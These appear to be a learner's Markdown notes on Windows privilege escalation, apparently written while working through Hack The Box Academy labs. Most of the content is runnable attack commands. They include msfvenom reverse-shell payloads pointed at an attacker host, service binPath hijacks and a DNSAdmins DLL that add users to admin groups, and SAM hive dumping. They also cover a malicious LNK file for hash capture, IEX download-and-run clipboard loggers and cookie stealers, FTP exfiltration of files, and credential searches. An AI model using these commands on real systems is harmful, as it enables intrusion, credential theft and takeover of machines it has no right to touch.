# Windows Priv Escalation  
[Winpeas](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat)

[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)

[PowerUP](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/refs/heads/master/PowerUp/PowerUp.ps1)
## Local Privileges 
```
whoami /priv
```
### SeDebugPrivilege 
> What it does: Grants users critical access to system components and can be utilized for remote command execution 

### SeTakeOwnership
> What it does: Lets you take ownership of certain files 

```
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
```
### SeImpersonatePrivilege
What it does: Lets you impersonate system user 
#### Common tools: 
##### JuicypotatoNG

```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```
##### God Potato 
- Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
- Grab the binary that matches the installed runtime (e.g., GodPotato-NET4.exe on modern Server 2022).
- If your initial execution primitive is a webshell/UI with short timeouts, stage the payload as a script and ask GodPotato to run it instead of a long inline command

```
GodPotato -cmd "cmd /c whoami"
```


##### PrintSpoofer
>[!NOTE]
>What software or operating systems or windows versions does printspoofer work?
>
>From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.

```
.\PrintSpoofer.exe -i -c cmd

```

### SeLoadDriverPrivilege

```
git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege
```

```prompt:powershell
C:\Tools>
iwr "http://url:8000/Capcom.sys
iwr "http://url:8000/LoadDriver.exe"
iwr "http://url:8000/ExploitCapcom.exe"
.\LoadDriver.exe System\CurrentControlSet\MyService C:\Tools\Capcom.sys
.\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o rev.exe
```


### SeBackupPrivilege
Can copy sensitive documents and use it for privilege escalation and lateral movement 
**Enumeration** 
```
whoami /priv | findstr /i "SeBackupPrivilege"
```

**Exploitation** 

```cmd prompt:C:/Users/Documents 
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```
```prompt:htb-student~#
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## Group Privileges
- Built-in groups are groups that are shipped with the operating system or get added when active directory domain services role is installed on system to promote a server to a Domain Controller
#### Event Log Reader

```Powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
```
|Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```


==need to get more info==
#### DNSAdmins Group

**Checks whether you are part of the group** 
```
Get-ADGroupMember -Identity DnsAdmins
```

**Creating and executing payload** 
```bash  
#Create payload 
//[!question] help 
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll <----

#Start local ftp server 
host@hostmachine> sudo python3 -m pip install pyftpdlib 

host@hostmachine > sudo python3 -m pyftpdlib --port 21 -u user -P pass

C:\htb> ftp 10.10.10.1 

C:\htb> get adduser.dll

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Path\to\adduser <-------------------



```

*Finding SID 
```
(Get-LocalUser -Name "netadm").SID

sc.exe sdshow DNS 

```


**Restarting DNS Process** 
Confirm Key Is Added:LiArrowBigRight: Remove Key :LiArrowBigRight: Start Service Again 
```
C:\Windows\System32> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

C:\Windows\System32> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

sc.exe start dns 
```

**WPAD Record**: A method used by clients to locate URI of a configuration file using DHCP and/or DNS discovery methods 
```Powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

- for some reason sc.exe query dns works well but sc query dns does not work 

> [!NOTE] Title
>  Recommended to use CMD, not powershell 
>  Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31

####  Hyper-V Administrators

- have access to all hyper v features 
- if domain controllers have been virtualized, then virtualization admins should be considered domain admins 
- deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
#### Print Operators


####  Server Operators 
- Grants SeBackupPrivilege and SeRestorePrivilege 
- SeBackupPrivilege

**Enumeration**
```
sc qc AppReadiness 
```

```Powershell
Get-Service -Name AppReadiness | Select-Object *

```

```Powershell
c:\Tools\PsService.exe security AppReadiness 

```
Payload/Priv Esc
> [!NOTE] Payload Consideration
> All of what is mentioned below is REQUIRED to get this to work, none of it is not important 

```
sc config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"
sc start AppReadinesss 
net localgroup Administrators 

```

- AppReadiness is misconfigured to allow Server Operators full control and let them change how a service starts 
-  ONly possible if someon has service_all_access
**Data Exfilitration**
```bash
secretsdump.py server_adm@10.129.43.42
```
## Attacking the OS 
#### User Account Control 
[Bypass UAC Project](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
**Enumeration**
```powershell
whoami /user 

```
```powershell
net localgroup administrators

```
```powershell
#confirm UAC is enabled 
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

```
==what does the above do? ==
```powershell 
#Checking UAC level 
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```


```powershell imp:3
cmd /c echo %PATH%

# determines what folders are within user's profile and writable. given to find out where we need to be when downloading our reverse shell
```


 **Exploitation**
[UAC-Information](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UACBypass.md) | [UACMe Project](https://github.com/hfiref0x/UACME)
#### Weak Permissions 
binary path
**Enumeration**
- check ownership 
- check icals
- run in cmd session, not powershell 
```prompt:cmd|C:\Tools
accesschk.exe -kwsu "Everyone" HKLM\SYSTEM\CurrentControlSet\Services  

accesschk.exe -kwsu "BUILTIN\Users" HKLM\SYSTEM\CurrentControlSet\Services
```
cmd prompt:C:/Users/Documents 
**Exploitation**
1. Determine what service binaries have weak acls 
```cmd prompt:C:\Users\user\Documents
.\SharpUp.exe audit 
```
2.  Verify acls are weak with icacls
```CommandShell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
3. Change service binary path of whatever service has weak acl 
```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
4. Start service
```C
sc start WindscribeService
```
5. Ensure privileges have been changed
```Powershell
net localgroup administrators
```

**Reverting Back

```
[[sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"]]
```

---
**Unquoted Service Path** 
[[Unquoted Service Path Script]]

> [!INFO]
> 1. Identify vulnerable service
> 2. Verify Prerequisites 
> 3. Create payload 
> 4. Deploy payload
> 5. Trigger Execution 
> 6. Verify success

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ 
```

- *Vulnerable*: ``C:\Program Files\MyApp\service.exe``
- *Secure:* - - `"C:\Program Files\MyApp\service.exe"`
```cmd
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

**How to search for unquoted service paths** 
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

==**Permissive Registry ACLS** == 
What are these? 
```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

```

> [!important] Adjusting Registry ACLS
> If a  low-privileged user has **write** permissions to a service's binary path or configuration, they can often:
> 
> 1. Overwrite the executable that the service runs.
> 2. Change the service to run as `SYSTEM` (Administrator) the next time it starts.
> 3. Escalate their privileges on the machine.


> [!important]
> This must be run in powershell not anywhere else

> [!QUESTION]  Specific Activity Requirements
> For some reason, this activity requres you to copy the malicious executable and replace the original vulnerable service with  weak permissions with it, and gain a reverse shell to do anything. not exactly sure why, but it tripped me up  or the longest time and is worth looking into 
> 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe > SecurityService.exe
```

```powershell prompt:cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe" sc start SecurityService`

```

#### Kernel Vulnerabilities
[Kernel Vulnerability Resource Database](https://msrc.microsoft.com/update-guide/vulnerability)

> [!note]
> Takeaway 
> -When completing activities, try all the files that exist in a directory, regardless of whether you think they will help you find the flag or not 

#### DLL Injection
- Tricking Windows machines to load a malicious file by making it look for files in the wrong order
- **How To Find Missing DLL**
```cmd
procmon #ran inside sysinternals

```
**Exploiting Missing DLLS**
- Where system looks for DLL depends on settings 
- **DLL Safe Search Mode Activated**
	- 1. Application directory
	- 2. System directory 
	- 3. 16 bit system directory
	- 4. Windows directory
	- 5. Current directory
- **DLL Search Mode Deactivated** 
	- 1. Application directory
	- 2. Current directory 
	- 3. System directory 
	- 4. 16-bit directory 
	- 5. Windows directory 
	- 6. Directories listed in path environment
```
- To change order, create this **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\SafeDllSearchMode 
  set to zero 
```
**Load Library**
- Widely used method for DLL injection
**Manual Mapping** 
1. Loads DLL as raw data into injecting process 
2. Maps the DLL sections into the targeted process 
3. Injects shellcode into the target process and executes it 
**DLL Hijacking 
[Kopelling](https://github.com/monoxgas/Koppeling)
[Spartacus](https://github.com/sadreck/Spartacus?tab=readme-ov-file#dll-hijacking)
[DLL Sideloading](https://www.qbitconsulting.io/exploitation-techniques/dll-sideloading)
 - an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.
## Credentials
[Lazagne](https://github.com/AlessandroZ/LaZagne)
[SessionGopher](https://github.com/Arvanaghi/SessionGopher)
[Snaffler](https://github.com/SnaffCon/Snaffler) 
#### **Finding Files On The Machine**

*examples*
[[find_str guide]](https://ss64.com/nt/findstr.html)
```powershell
findstr /SIM /C:"password", "bob" *.txt *.ini *.cfg *.config *.xml  
#searches for configuration files
```

```
findstr /I /S /N /C:"password" /C:"secret" /C:"api_key" /C:"apikey" /C:"token" /C:"credential" /C:"private_key" /C:"connection_string" /C:"client_secret" /C:"aws_access" /C:"azure_key" /C:"stripe" /C:"webhook" *.*

```

```
findstr /I /S /N /C:"password" *.env *.config *.json *.yaml *.yml *.xml *.properties *.ini *.cfg *.pem *.key *.p12 *.pfx *.crt

```


```powershell
findstr /si password *.xml *.ini *.txt *.config

```

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
```powershell
(Get-PSReadLineOption).HistorySavePath #displaying history save path 
#history save path 
```


```

gc (Get-PSReadLineOption).HistorySavePath #reading information from history save path 


```

If we have permission to abuse DPAPI, then we can recover cleartext crednetials from pass.xml
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml' #[!note|Cleartext credential gathering]
```

cmdkey
- command that lets you create, list, or delete stored user names, passwords, or credentials 
```cmd
cmdkey /list

```


```powershell
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
#### Finding Files From Browser
SharpChrome
```powershell 
\SharpChrome.exe logins /unprotect
```
#### Finding Files or Credentials From Password Managers
.kdbx file
1. Use keepass2john script to extract hash in hashcat format
2. Specify hash mode 13400

#### Understanding Autologon 
Autologon 
```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
file:///Users/creightonlewis/Downloads/ws-commands.pdf

**Decrypting Powershell Credentials**

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'

$credential.GetNetworkCredential().username

$credential.GetNetworkCredential().password
```

#### Viewing Sticky Notes

> [!NOTE]
> For this, it has to be run as administratrion

``` hl:1,6
Victim Machine
C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

ftp put plum.sqlite

Attacking Machine
sudo python3 -m pip install pyftpdlib
sudo python3 -m pyftpdlib --port 21 -u user -P pass --write

```
##  Citrix Breakout
- ==Citrix== 
- Sometimes environments are restricted and users are unable to access files and locations that they normally would be able to access 
- Using programs or applications that are allowed is a way to "breakout " of these environments 
- **Breaking Out Of File Explorer Steps**
	- 1. Run application that is allowed (Microsoft Paint)
	- 2. Click file > open to open the dialog box 
	- 3. Enter the ==UNC== path
```
\\\127.0.0.1\c$\users\pmorgan
```
 under the file name field, with file-type set to All Files 
- **Accessing SMB share from restricted environment **
	1. Start smb server on ubuntu machine that is hosting the citrix environment(NOT THE ATTACK MACHINE) 
	2. In the citrix environment initiate paint application. navigate to the file menu and select "open". Within dialog box, enter the path as the attacker ip address\share 
	3. Ensure file-type paramater is configured to all files 
**Alternate Explorers & Registries  **
- Alternate file system editors can be employed as work around, as well as different registry editors 
**Shortcut Files**
- Can be edited to allow unauthorized access or created to create unaothorized access 
- 1. Right click on desired shortcut 
- 2. Select properties 
- 3. Within target field, modify path to intended folder for access
**Script Execution **
1. Create new text file and name it "evil.bat" 
2. Open "evil.bat" with a text editor such as notepad
3. Input cmd into file.Literally just 'cmd'
4. Save file and execute 
# More Techniques
## Users 


```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}

```


https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/

Script to generate malicious lnk file 

```
sudo responder -I eth0 -w -d 
```

```
$objShell = New-Object -ComObject WScript.Shell 
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png" 
$lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request." 
$lnk.HotKey = "Ctrl+Alt+O" $lnk.Save
```

Crucial notes
	- Had to copy and paste each line individually for this to work 
	-  The command provided in the example will not work, the one written above will 
	- Did not actually have to browse to any directory 
	- Regardless of how long I wanted, the hash would not appear 
## Pilaging 
- Searching all the different systems, programs, and applications that exist is crucial 
- mRemoteNG is tool that saves connection info and credentials to file called confCons
`%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

```
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

**Situation One**
	- hard coded master password
	- Password decrypted with mrremoteng_decrypt
	- https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/refs/heads/master/mremoteng_decrypt.py

```
git clone https://github.com/haseebT/mRemoteNG-Decrypt
python3 mremoteng_decrypt.py -s {encrypted-pass}
```

**Situation Two**
- Encrypted configuration file 
- Custom password 
	- Must either crack the protected attribute or the password itself 
-
**Cookies**
1. Determine where cookies are stored for the application 
2. Use the pythons script cookieextractor.py to extract cookies from database
3. Use firefox extension to add cookie to browser
4. You can login automatically 

**Clipboard **

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

Invoke-ClipboardLogger

```


**Backups**
1. Initialize backup directory 
```
mkdir E:\restic2; restic.exe -r E:\restic2 init
```
2. Backup directory
```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```
3. Backup directory with VSS 
```powershell
3. restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

**Cookie Stealing**
- Firefox saves cookies in SQLite database file named cookies.sql
- located in each user's App Data directory

From SQLIte
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

```powershell
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

From SharpChromium

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

```powershell
Invoke-SharpChromium -Command "cookies slack.com"
```

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"f
```


**Clipboards**


```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

==What directory do I need to be in in order to do this ==
```powershell
Invoke-ClipboardLogger
```
**Role and Service**

```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

```powershell
$env:RESTIC_PASSWORD = 'Password'
```

```powershell
restic.exe -r E:\restic2\ backup C:\SampleFolder
```
```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```
```powershell hlt:target hlt:99
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

## LOLBas
- schtasks command can be used to find scheduled tasks on the system 

**Enumerating Scheduled Windows Processes**
```command
schtasks /query /fo LIST /v 

```
```
Get-ScheduledTask | select TaskName, State

```
**User/Computer Description Field**
- Sometimes user passwords or important information is stored here
- Most commonly/best utilized for active directory 
```Powershell
Get-LocalUser
```
```
Get-WmiObject -Class Win32_OperatingSystem | select Description

```
**Mount VHDX/VMDK**
- Snaffler can help perform thorough enumeration of shared drives
- VMDK: 
- ==VHD==:
```bash 

guestmount -a [DISK-name] -i --ro /mnt/vdk

guestmount -a [DISK-name] -i --ro /mnt/vhdx/ -m /dev/sda1
```

**Windows** 
```powershell 

Get-Disk | Select-Object FriendlyName, Location, Path 

```

1. Open disk management 
2. Right click on file and choose mount 

